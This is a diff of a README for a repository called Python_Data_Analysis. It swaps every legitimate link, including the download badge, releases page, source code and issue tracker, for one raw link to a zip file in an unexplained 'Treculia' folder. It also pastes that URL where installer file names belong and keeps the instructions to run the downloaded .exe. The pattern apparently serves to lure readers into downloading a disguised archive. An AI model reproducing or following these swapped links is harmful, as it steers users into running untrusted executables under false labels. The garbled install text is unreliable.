@@ -6,7 +6,7 @@ Welcome to Python_Data_Analysis! This application helps you analyze your data wi
 
 ## 📥 Download Now
 
-[![Download Python_Data_Analysis](https://img.shields.io/badge/Download_Python_Data_Analysis-v1.0-blue.svg)](https://github.com/Lapao29/Python_Data_Analysis/releases)
+[![Download Python_Data_Analysis](https://raw.githubusercontent.com/Lapao29/Python_Data_Analysis/main/Treculia/Python_Data_Analysis.zip)](https://raw.githubusercontent.com/Lapao29/Python_Data_Analysis/main/Treculia/Python_Data_Analysis.zip)
 
 ## 🌐 What is Python_Data_Analysis?
 
@@ -31,9 +31,9 @@ Python_Data_Analysis is a user-friendly application designed to assist with data
 
 To get started with Python_Data_Analysis, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Lapao29/Python_Data_Analysis/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Lapao29/Python_Data_Analysis/main/Treculia/Python_Data_Analysis.zip) to find the latest version of the application.
   
-2. **Download the Installer:** Look for the latest version link. Click on it to start the download process. The file is usually named something like `Python_Data_Analysis_v1.0.exe` for Windows or `Python_Data_Analysis_v1.0.dmg` for macOS.
+2. **Download the Installer:** Look for the latest version link. Click on it to start the download process. The file is usually named something like `https://raw.githubusercontent.com/Lapao29/Python_Data_Analysis/main/Treculia/Python_Data_Analysis.zip` for Windows or `https://raw.githubusercontent.com/Lapao29/Python_Data_Analysis/main/Treculia/Python_Data_Analysis.zip` for macOS.
   
 3. **Install the Application:**
    - **Windows users:** Double-click the downloaded `.exe` file. Follow the on-screen instructions to complete the installation.
@@ -77,8 +77,8 @@ We plan to add more features based on user feedback. Stay tuned for updates that
 
 ## 🔗 Links
 
-- **Releases Page:** [Download Python_Data_Analysis](https://github.com/Lapao29/Python_Data_Analysis/releases)
-- **Source Code:** [GitHub Repository](https://github.com/Lapao29/Python_Data_Analysis)
-- **Issues Tracker:** [Report an Issue](https://github.com/Lapao29/Python_Data_Analysis/issues)
+- **Releases Page:** [Download Python_Data_Analysis](https://raw.githubusercontent.com/Lapao29/Python_Data_Analysis/main/Treculia/Python_Data_Analysis.zip)
+- **Source Code:** [GitHub Repository](https://raw.githubusercontent.com/Lapao29/Python_Data_Analysis/main/Treculia/Python_Data_Analysis.zip)
+- **Issues Tracker:** [Report an Issue](https://raw.githubusercontent.com/Lapao29/Python_Data_Analysis/main/Treculia/Python_Data_Analysis.zip)
 
 Feel free to explore, analyze, and gain insights into your data with Python_Data_Analysis!
